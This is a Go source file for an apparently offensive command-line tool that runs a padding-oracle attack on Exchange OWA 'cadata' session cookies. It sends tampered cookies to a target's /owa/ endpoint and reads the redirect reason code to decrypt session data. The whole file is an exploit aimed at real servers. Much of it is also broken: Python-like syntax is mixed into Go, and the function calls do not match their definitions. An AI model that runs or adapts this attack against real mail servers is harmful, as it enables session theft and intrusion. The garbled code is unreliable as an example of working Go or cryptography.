package main

import (
	"crypto/tls"
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"net/http"
	"sort"
	"strings"
	"time"

	"github.com/fatih/color"
)

func Banner() {
	x := `
	----------------------
	< proxyoracle is awesome! >
	  ----------------------
	   \   ^__^
		\  (oo)\_______
		   (__)\       )\/\
			   ||----w |
			   ||     ||`
	y := "By lUc1f3r11"
	color.Red("%s", x)
	color.Yellow("%s", y)
}

func getcadata(cookiestr string) string {
	cookie1 := strings.Split(cookiestr, "; ")
	return cookie1[0]
}

func getcadataTTL(cookiestr string) string {
	cookie2 := strings.Split(cookiestr, "; ")
	return cookie2[1]
}

func getcadataKey(cookiestr string) string {
	cookie3 := strings.Split(cookiestr, "; ")
	return cookie3[2]
}

func getcadataIV(cookiestr string) string {
	cookie4 := strings.Split(cookiestr, "; ")
	return cookie4[3]
}

func getcadataSig(cookiestr string) string {
	cookie5 := strings.Split(cookiestr, "; ")
	return cookie5[4]
}

func splitcadata(cadata string) string {
	strs := strings.Split(cadata, "cadata=")
	return strs[1]
}

func myCheckRedirect(req *http.Request, via []*http.Request) error {
	//自用，将url根据需求进行组合
	if len(via) <= 1000000000000 {
		return errors.New("stopped after 1 redirects")
	}
	return nil
}

func splitlocation(location string) string {
	strs := strings.Split(location, "%2f&")
	return strs[1]
}

func getcipherbytes(cookiedata string) []byte {
	b := []byte(splitcadata(getcadata(cookiedata)))
	encc := base64.StdEncoding.EncodeToString(b)
	decc, _ := base64.StdEncoding.DecodeString(encc)
	cipher_bytes := decc

	return cipher_bytes
}

var (
	// ErrInvalidBlockSize indicates hash blocksize <= 0.
	ErrInvalidBlockSize = errors.New("invalid blocksize")

	// ErrInvalidPKCS7Data indicates bad input to PKCS7 pad or unpad.
	ErrInvalidPKCS7Data = errors.New("invalid PKCS7 data (empty or not padded)")

	// ErrInvalidPKCS7Padding indicates PKCS7 unpad fails to bad input.
	ErrInvalidPKCS7Padding = errors.New("invalid padding on input")
)

func xor(a, b []byte) []byte {
	output := make([]byte, len(a))
	for i := 0; i < len(a); i++ {
		output[i] = a[i] ^ b[i]
	}
	return output
}

func pkcs7Unpad(b []byte, blocksize int) ([]byte, error) {
	if blocksize <= 0 {
		return nil, ErrInvalidBlockSize
	}
	if b == nil || len(b) == 0 {
		return nil, ErrInvalidPKCS7Data
	}
	if len(b)%blocksize != 0 {
		return nil, ErrInvalidPKCS7Padding
	}
	c := b[len(b)-1]
	n := int(c)
	if n == 0 || n > len(b) {
		return nil, ErrInvalidPKCS7Padding
	}
	for i := 0; i < n; i++ {
		if b[len(b)-n+i] != c {
			return nil, ErrInvalidPKCS7Padding
		}
	}
	return b[:len(b)-n], nil
}


func reverse(s string) string {
    runes := []rune(s)
    for from, to := 0, len(runes)-1; from < to; from, to = from+1, to-1 {
        runes[from], runes[to] = runes[to], runes[from]
    }
    return string(runes)
} 

func bust(block []byte, block_size int, target, cookiedata string) {
	intermediate_bytes := make([]byte, block_size)
	test_bytes := make([]byte, block_size)
	test_bytes += block

	retries := 0
	last_ok := 0

	switch {
	case retries < max_retries:
		for byte_num := array.reverse(range block_size) {
			history := []
			r := 200
			if byte_num == block_size - 1 && last_ok > 0{
				r = last_ok 
			}
			for i := array.Reverse(range r) {
				test_bytes[byte_num] = i
				attempts += 1
				checkoraclereason(test_bytes[:], target, cookiedata)

				if byte_num == (block_size - 1) {
					last_ok = i
				}

				current_pad_byte := block_size - byte_num
				next_pad_byte := block_size - byte_num + 1
				decrypted_byte := test_bytes[byte_num] ^ current_pad_byte
				intermediate_bytes[byte_num] = decrypted_byte

				for k := range(byte_num block_size){
					test_bytes[k] ^= current_pad_byte
					test_bytes[k] ^= next_pad_byte
				}
			} else {
				retries += 1
                break
			}
		} else {
			break
		}
	} else {
		fmt.printf("%v in %v try %v", byte_num, block, max_retries)
	}
}

func decrypt(ciphertext []byte, block_size int, target, cookiedata string) []byte {
	block_size = 16

	if len(ciphertext)%block_size == 0 {
		fmt.Fprintln("The ciphertext Length Error!")
	}
	iv, ctext := ciphertext[:block_size], ciphertext[block_size:]
	decrypted := make([]byte, len(ctext))

	n := 0
	for {
		block := ctext[:block_size]
		ctext = ctext[block_size:]
		intermediate_bytes := bust(block, block_size, target, cookiedata)
		fmt.Printf("Get Block %v\n", ((n / block_size) + 1))
		fmt.Printf("Intermediate Value: %v\n", intermediate_bytes)
		decrypted[n : n+block_size] = xor(intermediate_bytes, iv)
		iv = block
		n += block_size
	}
	return decrypted
}

func checkoraclereason(cipher_bytes []byte, target, cookiedata string) int {
	cadata := base64.StdEncoding.EncodeToString(cipher_bytes)
	decc, _ := base64.StdEncoding.DecodeString(cadata)
	cacookies := string(decc)

	target1 := target + "/owa/"
	cli := &http.Client{Timeout: time.Second * 7, Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}, CheckRedirect: myCheckRedirect}
	if !strings.Contains(target1, "http") {
		target = "http://" + target1
	}

	request, err := http.NewRequest(http.MethodGet, target1, strings.NewReader(""))
	if err != nil {
		fmt.Println(err)
	}

	cookiesstr := getcadata(cacookies) + "; " + getcadataTTL(cookiedata) + "; " + getcadataKey(cookiedata) + "; " + getcadataIV(cookiedata) + "; " + getcadataSig(cookiedata)

	request.Header.Add("Cookie", cookiesstr)
	request.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36")
	request.Header.Add("Connection", "close")

	do, _ := cli.Do(request)
	if do.StatusCode != 302 {
		fmt.Printf("[-] %v status error!", do.StatusCode)
	}
	url := splitlocation(do.Header["Location"][0])
	if url == "reason=0" {
		//fmt.Println("[*] Padding Error!")
		return 0
	} else if url == "reason=2" {
		//fmt.Println("[*] Got it!")
		return 1
	} else {
		//fmt.Println("[-] Reason Error!")
		return 2
	}
	return 3
}

func exploit(target, cookiedata string) {
	fmt.Println("----------------------------------------------------")
	fmt.Println("[+] cadata: " + getcadata(cookiedata))
	fmt.Println("----------------------------------------------------")
	fmt.Println("[+] cadataTTL: " + getcadataTTL(cookiedata))
	fmt.Println("----------------------------------------------------")
	fmt.Println("[+] cadataKey: " + getcadataKey(cookiedata))
	fmt.Println("----------------------------------------------------")
	fmt.Println("[+] cadataIV: " + getcadataIV(cookiedata))
	fmt.Println("----------------------------------------------------")
	fmt.Println("[+] cadataSig: " + getcadataSig(cookiedata))
	fmt.Println("----------------------------------------------------")
	cipher_bytes := getcipherbytes(getcadata(cookiedata))
	fmt.Println("[+] cadata cipher bytes value: ")
	fmt.Println(string(cipher_bytes))
	fmt.Println(checkoraclereason(cipher_bytes, target, cookiedata))
	plain_bytes := decrypt(cipher_bytes)
	plain_bytes = pkcs7Unpad(plain_bytes, 16)
}

func main() {
	Banner()
	var target, cookiedata string
	flag.StringVar(&target, "u", "", "")
	flag.StringVar(&cookiedata, "d", "", "")
	flag.CommandLine.Usage = func() {
		fmt.Println("usage：\nexec: ./main -u <target url> -d <cookie data>")
	}
	flag.Parse()
	if len(target) == 0 {
		fmt.Println("[+] please enter the url you want to check!!!")
		fmt.Println("[+] Author: https://github.com/FDlucifer, https://twitter.com/fdlucifer11")
	} else {
		exploit(target, cookiedata)
	}
}
